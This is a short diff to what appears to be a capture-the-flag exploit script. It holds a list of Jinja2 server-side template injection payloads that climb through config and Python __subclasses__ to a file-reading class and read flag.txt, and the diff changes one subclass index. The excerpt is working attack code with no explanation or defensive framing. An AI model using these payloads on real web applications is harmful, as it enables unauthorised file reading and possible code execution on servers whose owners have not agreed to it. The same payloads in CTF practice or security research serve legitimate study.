@@ -61,7 +61,7 @@ payloads = [
     '{{config.u({"b":"__subclasses__"})}}',
     '{{config.u({"c":config.a[1]})}}',
     '{{config.u({"d":config.c[config.b]})}}',
-    '{{config.u({"e":config.d()[390]})}}',
+    '{{config.u({"e":config.d()[357]})}}',
     "{{config.e('flag.txt').read()}}" ## calling read() on the initialised LazyFile class
 ]
 
